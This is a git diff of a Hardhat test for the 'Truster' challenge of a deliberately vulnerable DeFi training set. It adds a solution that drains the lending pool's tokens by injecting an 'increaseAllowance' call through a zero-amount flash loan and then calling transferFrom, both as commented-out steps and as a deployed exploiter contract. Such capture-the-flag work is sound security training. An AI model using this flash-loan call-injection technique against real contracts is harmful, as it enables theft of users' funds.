@@ -1,3 +1,5 @@
+// import token from "../../artifacts/contracts/DamnValuableToken.sol/DamnValuableToken.json";
+
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
@@ -15,6 +17,7 @@ describe('[Challenge] Truster', function () {
 
         this.token = await DamnValuableToken.deploy();
         this.pool = await TrusterLenderPool.deploy(this.token.address);
+        this.tokenInterface = DamnValuableToken.interface;
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
@@ -29,6 +32,12 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        // let callData = this.tokenInterface.encodeFunctionData("increaseAllowance", [ attacker.address, TOKENS_IN_POOL.toString() ])
+        // await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, callData)
+        // await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
+
+        const TrusterExploiter = await ethers.getContractFactory('TrusterExploiter', deployer);
+        await TrusterExploiter.connect(attacker).deploy(this.pool.address, TOKENS_IN_POOL, this.token.address);
     });
 
     after(async function () {
